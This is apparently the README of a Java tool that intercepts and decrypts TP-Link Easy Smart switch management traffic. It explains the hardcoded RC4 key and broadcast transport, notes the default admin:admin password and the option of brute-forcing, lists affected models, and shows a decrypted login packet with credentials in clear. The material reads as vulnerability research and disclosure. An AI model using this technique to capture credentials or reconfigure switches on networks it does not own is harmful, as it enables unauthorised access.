## Running the tool
Compile: `javac src/Intercept.java`

Run: `java Intercept`

## Why is it possible to intercept the management traffic?
- The traffic goes over broadcast.
- The traffic is encrypted using RC4 with a fixed key located *hardcoded* in the "Easy Smart Configuration Utility"

## Is it possible to configure foreign devices?
Yes, after intercepting or bruteforcing the password (default is admin:admin on all devices, the maximum password length is 16) without any restrictions.

##Package
`<header>[<type><length><value>]`  
The body may contain more than one data block called "TLV".

##General communications
The password is transmitted on each configuration change request.

##List of possibly affected devices
- TL-SG1024DE 1.0
- TL-SG1024DE 2.0
- TL-SG1016DE 1.0
- TL-SG1016DE 2.0
- TL-SG108E 1.0
- TL-SG108E 2.0
- TL-SG105E 1.0
- TL-SG105E 2.0
- TL-SG108PE 1.0

##Sample output for a login

	===NEW PACKET ON PORT 29809 FROM /172.19.79.55
	Decrypted data:
	 Version:1
	 OPCODE:3
	 MAC:F4F26DD27F12
	 HOST MAC:080027D3524B
	 SEQUENCE NUMBER:618
	 ERROR CODE (7 or 8 are somehow bad):0
	 LENGTH:56
	 FRAGMENT OFFSET:0
	 TOKEN ID:27750
	 CHECKSUM (apparently not implemented):0
	  BODY:
	 -START TLV-
	  TYPE:512 (Username)
	  LENGTH:6
	  BODY:61646D696E00 (admin::StringType)
	 -START TLV-
	  TYPE:514 (Password)
	  LENGTH:6
	  BODY:61646D696E00 (admin::StringType)
	 -START TLV-
	  TYPE:-1 (Unknown)
	  LENGTH:0
	  BODY: (::unknown)
	  RAW: 0103F4F26DD27F12080027D3524B026A000000000038000000006C66000000000200000661646D696E000202000661646D696E00FFFF0000